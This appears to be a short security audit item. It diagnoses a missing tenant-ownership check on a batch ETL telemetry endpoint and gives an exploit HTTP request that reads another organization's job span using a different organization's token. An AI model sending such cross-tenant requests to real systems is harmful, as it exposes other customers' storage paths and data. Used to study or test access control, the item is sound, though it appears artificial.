diagnosis: The batch ETL telemetry endpoint inspects OpenTelemetry spans using req.params.jobSpanId directly. It fails to verify whether the requesting user belongs to the organization that executed the ETL job, exposing sensitive S3 bucket URIs, file paths, and dataset sizes of competitor organizations.
exploit_request:
GET /telemetry/jobs/span_etl_batch_corp_beta_9918 HTTP/1.1
Host: etl.pipeline.internal:6066
Authorization: Bearer <corp_alpha_jwt>
Accept: application/json
